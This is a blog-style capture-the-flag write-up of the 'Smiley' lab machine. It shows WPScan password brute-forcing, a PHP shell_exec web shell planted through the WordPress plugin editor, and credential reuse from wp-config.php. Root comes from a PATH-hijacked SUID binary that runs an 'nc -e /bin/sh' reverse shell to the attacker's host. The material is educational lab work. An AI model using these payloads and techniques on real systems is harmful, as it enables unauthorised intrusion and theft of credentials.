---
id: 813
title: 'Wizard Labs &#8211; Smiley'
date: 2019-04-26T12:22:07+01:00
author: rowbot
layout: post
guid: http://offsecnewbie.com/?p=813
permalink: /2019/04/26/wizard-labs-smiley/
image: /wp-content/uploads/2019/04/image-37-176x250.png
categories:
  - Wizard Labs
tags:
  - SUID
  - Wordpress
---
<div class="wp-block-image">
  <figure class="aligncenter"><img src="https://i2.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-37.png?w=680" alt="" class="wp-image-814" srcset="https://i2.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-37.png?w=176 176w, https://i2.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-37.png?resize=159%2C300 159w" sizes="(max-width: 176px) 100vw, 176px" data-recalc-dims="1" /></figure>
</div>

Even though the difficulty of this machine was 3/10 it took me quite a while to complete it. 

<div class="wp-block-image">
  <figure class="aligncenter"><img src="https://i0.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-38.png?w=680" alt="" class="wp-image-815" srcset="https://i0.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-38.png?w=874 874w, https://i0.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-38.png?resize=300%2C93 300w, https://i0.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-38.png?resize=768%2C238 768w" sizes="(max-width: 680px) 100vw, 680px" data-recalc-dims="1" /></figure>
</div>

nmap scan reveals a wordpress site running on port 80.

<div class="wp-block-image">
  <figure class="aligncenter"><img src="https://i0.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-39.png?w=680" alt="" class="wp-image-816" srcset="https://i0.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-39.png?w=821 821w, https://i0.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-39.png?resize=300%2C185 300w, https://i0.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-39.png?resize=768%2C473 768w" sizes="(max-width: 680px) 100vw, 680px" data-recalc-dims="1" /></figure>
</div>

After a lot of directory searching turned up with nothing. I only had a username &#8211; smiley. 

I forgot about the brute force method. You can use WPScan to brute force

<pre class="wp-block-preformatted">⚡  ~/Desktop/smiley <br />cat username  <br />smiley <br />wpscan --url http://10.1.1.42/ -P /usr/share/seclists/Passwords/darkweb2017-top10000.txt -U username  </pre>

Password found &#8211; music

<div class="wp-block-image">
  <figure class="aligncenter"><img src="https://i0.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-40.png?w=680" alt="" class="wp-image-818" srcset="https://i0.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-40.png?w=613 613w, https://i0.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-40.png?resize=300%2C59 300w" sizes="(max-width: 613px) 100vw, 613px" data-recalc-dims="1" /></figure>
</div>

That took me the guts of 5 hours to get that far. I&#8217;ve made a mental note not to forget about brute forcing when nothing else turns up.

<div class="wp-block-image">
  <figure class="aligncenter"><img src="https://i1.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-41.png?w=680" alt="" class="wp-image-819" srcset="https://i1.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-41.png?w=411 411w, https://i1.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-41.png?resize=290%2C300 290w" sizes="(max-width: 411px) 100vw, 411px" data-recalc-dims="1" /></figure>
</div>

I went to Plugins and Editor and added php code to index.php to see if I can get command execution 

<div class="wp-block-image">
  <figure class="aligncenter"><img src="https://i1.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-42.png?fit=680%2C104" alt="" class="wp-image-820" srcset="https://i2.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-42.png?w=1488 1488w, https://i2.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-42.png?resize=300%2C46 300w, https://i2.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-42.png?resize=768%2C117 768w, https://i2.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-42.png?resize=1024%2C156 1024w, https://i2.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-42.png?w=1360 1360w" sizes="(max-width: 680px) 100vw, 680px" /></figure>
</div>

<?php echo shell\_exec($\_GET[&#8216;cmd&#8217;]); ?> 

I activated the Hello Dolly plugin and refreshed the index page. I always view the source when I do this as it makes the output readable. 

<div class="wp-block-image">
  <figure class="aligncenter"><img src="https://i2.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-43.png?w=680" alt="" class="wp-image-821" srcset="https://i2.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-43.png?w=635 635w, https://i2.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-43.png?resize=300%2C172 300w" sizes="(max-width: 635px) 100vw, 635px" data-recalc-dims="1" /></figure>
</div>

Otherwise it will look like this

<div class="wp-block-image">
  <figure class="aligncenter"><img src="https://i2.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-44.png?w=680" alt="" class="wp-image-822" srcset="https://i2.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-44.png?w=609 609w, https://i2.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-44.png?resize=300%2C116 300w" sizes="(max-width: 609px) 100vw, 609px" data-recalc-dims="1" /></figure>
</div>

So I can get command execution. Now to get a nc reverse shell.

<div class="wp-block-image">
  <figure class="aligncenter"><img src="https://i2.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-45.png?w=680" alt="" class="wp-image-823" srcset="https://i2.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-45.png?w=476 476w, https://i2.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-45.png?resize=300%2C62 300w" sizes="(max-width: 476px) 100vw, 476px" data-recalc-dims="1" /></figure>
</div>

<div class="wp-block-image">
  <figure class="aligncenter"><img src="https://i0.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-46.png?w=680" alt="" class="wp-image-824" srcset="https://i0.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-46.png?w=523 523w, https://i0.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-46.png?resize=300%2C114 300w" sizes="(max-width: 523px) 100vw, 523px" data-recalc-dims="1" /></figure>
</div>

So I&#8217;m in as www-data but obviously can&#8217;t view user.txt as I&#8217;m not user mike

<pre>cd /home
$ ls
ls
mike
$ cd mike
cd mike
/bin/sh: 5: cd: can't cd to mike
</pre>

As the server is running wordpress I knew there would be a password stored in wp-config.php

<pre>// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define('DB_NAME', 'wpdatabase');

/** MySQL database username */
define('DB_USER', 'wpuser');

/** MySQL database password */
define('DB_PASSWORD', 'Il0veW0rdpress');

/** MySQL hostname */
define('DB_HOST', 'localhost');
</pre>

I&#8217;ll try to ssh using it and user mike and Il0veW0rdpress as the password 

<div class="wp-block-image">
  <figure class="aligncenter"><img src="https://i2.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-47.png?w=680" alt="" class="wp-image-826" srcset="https://i2.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-47.png?w=682 682w, https://i2.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-47.png?resize=300%2C86 300w" sizes="(max-width: 680px) 100vw, 680px" data-recalc-dims="1" /></figure>
</div>

<pre>mike@smiley:~$ cat user.txt 
b075f6e221bbe611fafa9b7ae3688379
mike@smiley:~$ 
</pre>

I noticed that there is a file with SUID bit set in mike&#8217;s home directory

<pre>mike@smiley:~$ ls -la listwww 
-rwsr-xr-x 1 root root 7332 Dec 27 06:03 listwww
mike@smiley:~$ 
</pre>

When I run it it lists the contents of /var/www/html

<pre>mike@smiley:~$ ./listwww 
index.php    readme.html  suid.c	   wp-admin	       wp-comments-post.php  wp-config.php  wp-cron.php  wp-links-opml.php  wp-login.php  wp-settings.php  wp-trackback.php
license.txt  suid	  wp-activate.php  wp-blog-header.php  wp-config-sample.php  wp-content     wp-includes  wp-load.php	    wp-mail.php   wp-signup.php    xmlrpc.php
listing /var/www/html mike@smiley:~$ 
</pre>

Doing strings listwww reveals 

<pre>UWVS
[^_]
listing /var/www/html 
sleep 3
/bin/ls /var/www/html
;*2$"
GCC: (Debian 7.3.0-11) 7.3.0
</pre>

I opened the file in Ghidra and it decompiled the binary to reveal in main

<div class="wp-block-image">
  <figure class="aligncenter"><img src="https://i0.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-48.png?w=680" alt="" class="wp-image-833" srcset="https://i0.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-48.png?w=433 433w, https://i0.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-48.png?resize=300%2C203 300w" sizes="(max-width: 433px) 100vw, 433px" data-recalc-dims="1" /></figure>
</div>

It looks like it says &#8220;listing /var/www/html&#8221; then sleeps for 3 seconds then does an ls on that directory. So I need to get this binary to run code which will give me root shell. Looking at the strings again I knew that as the ls command has a fully qualified path /bin/ls I could not take advantage of this. The sleep command however wasn&#8217;t fully qualified &#8211; it had just sleep. If it was it would have read /usr/bin/sleep.

So in order to run this I needed to change the PATH to /home/mike and put a sleep script in there which the listwww would hopefully run.

<pre>mike@smiley:~$ echo $PATH
/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
mike@smiley:~$ 
</pre>

<pre>mike@smiley:~$ export PATH=/home/mike/:$PATH
mike@smiley:~$ echo $PATH
/home/mike/:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
mike@smiley:~$ 
</pre>

I added a nc reverse shell to sleep. Ran the listwww binary again..

<pre>mike@smiley:~$ cat sleep 
nc -e /bin/sh 10.253.0.255 443
mike@smiley:~$ 
</pre>

and got a connection back! 

<pre><span style="background-color:#2E3436"> </span><span style="background-color:#2E3436"><font color="#C4A000">⚡ </font></span><span style="background-color:#3465A4"><font color="#2E3436"> ~/Desktop/smiley </font></span><font color="#3465A4"></font> <font color="#4E9A06">nc</font> -lnvp 443
listening on [any] 443 ...
connect to [10.253.0.255] from (UNKNOWN) [10.1.1.42] 40548
id
uid=0(root) gid=1000(mike) groups=1000(mike)
cat /root/root.txt
a16c33fc59fe0a3deecf6212b60f2b9b
</pre>